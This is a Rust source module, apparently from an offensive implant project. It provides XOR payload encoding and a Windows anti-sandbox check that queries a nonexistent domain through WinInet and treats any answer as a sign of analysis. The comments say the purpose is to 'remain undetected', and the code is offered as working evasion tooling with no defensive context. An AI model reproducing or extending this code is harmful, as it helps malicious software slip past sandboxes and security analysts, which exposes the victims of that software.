use std::error::Error;

/*
    Helper function for XOR - makes two slices the same length by repeating the shorter till it's the length of the longer
*/

#[cfg(feature = "xor")]
fn equalize_slice_len<T: std::clone::Clone>(slice_one: &[T], slice_two: &[T]) -> (Vec<T>, Vec<T>) {
    if slice_one.len() > slice_two.len() {
        (slice_one.to_vec(), slice_two.iter().cloned().cycle().take(slice_one.len()).collect())
    } else {
        (slice_one.iter().cloned().cycle().take(slice_two.len()).collect(), slice_two.to_vec())
    }
}

/*
    Helper function for XOR - XORs two slices of equal length
*/

#[cfg(feature = "xor")]
fn xor_u8_slices(slice_one: &[u8], slice_two: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    if slice_one.len() != slice_two.len() {
        return Err("The given slices are not the same length".into());
    }
    Ok(slice_one.iter()
             .zip(slice_two.iter())
             .map(|(&x1, &x2)| x1 ^ x2)
             .collect())
}

/*
    XOR implementation - takes in a key and a value and outputs the key ^ value byte-bye-byte
*/

#[cfg(feature = "xor")]
pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let equalilzed = equalize_slice_len(key, text);
    let key: &[u8] = &equalilzed.0[..];
    let text: &[u8] = &equalilzed.1[..];
    xor_u8_slices(key, text)
}

/*
    XOR not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
*/

#[cfg(not(feature = "xor"))]
pub fn xor_encrypt_decrypt(_key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    Ok(text.to_vec())
}

/*
    Antisand Windows implementation - basically looks to see if something fakes a response to a website
*/

#[cfg(all(windows, feature = "antisand"))]
use std::mem;
#[cfg(all(windows, feature = "antisand"))]
use std::ffi::CString;
#[cfg(all(windows, feature = "antisand"))]
extern crate windows;
#[cfg(all(windows, feature = "antisand"))]
use windows::Win32::Foundation::PSTR;
#[cfg(all(windows, feature = "antisand"))]
use windows::Win32::Networking::WinInet::{InternetOpenA, InternetOpenUrlA};

#[cfg(all(windows, feature = "antisand"))]
pub fn pound_sand() -> bool {

    // Call InternetOpenA to get a handle that can be used in an actual internet request
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenA.html
    let mut lpsz_agent: PSTR = unsafe { mem::zeroed() };
    lpsz_agent.0 = CString::new("Name in user-agent").unwrap().into_raw() as *mut u8;
    let lpsz_proxy: PSTR = unsafe { mem::zeroed() };
    let lpsz_proxy_bypass: PSTR = unsafe { mem::zeroed() };
    let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, lpsz_proxy, lpsz_proxy_bypass, 0) };

    // Call InternetOpenUrlA on a fake website; if there is a response, it's a sandbox trying to get you to take further action
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenUrlA.html
    let mut lpsz_url: PSTR = unsafe { mem::zeroed() };
    lpsz_url.0 = CString::new("https://www.thisisafakewebsiteorelsetheantisanboxcheckwillfail4sure.com").unwrap().into_raw() as *mut u8;
    let lpsz_headers: PSTR = unsafe { mem::zeroed() };
    let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, lpsz_headers, 0, 0, 0) };
    if website != 0 as _ {
        return true
    }
    false
}

/*
    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
*/

#[cfg(all(target_os = "linux", feature = "antisand"))]
pub fn pound_sand() -> bool {
    false
}

/*
    Antisand not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
*/

#[cfg(not(feature = "antisand"))]
pub fn pound_sand() -> bool {
    false
}
